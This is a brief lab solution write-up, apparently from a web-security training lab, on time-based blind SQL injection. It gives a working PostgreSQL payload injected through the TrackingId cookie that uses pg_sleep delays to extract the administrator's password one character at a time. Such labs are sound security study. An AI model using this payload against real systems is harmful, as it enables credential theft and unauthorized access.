# Lab 13: Blind SQL Injection with Time Delays

* **Solution**: Inject a pg_sleep delay into TrackingId to confirm a condition, then extract the admin password via delays per character.
* **Final Payloads**:
  * TrackingId=xyz'; SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator' -- (repeat for each position)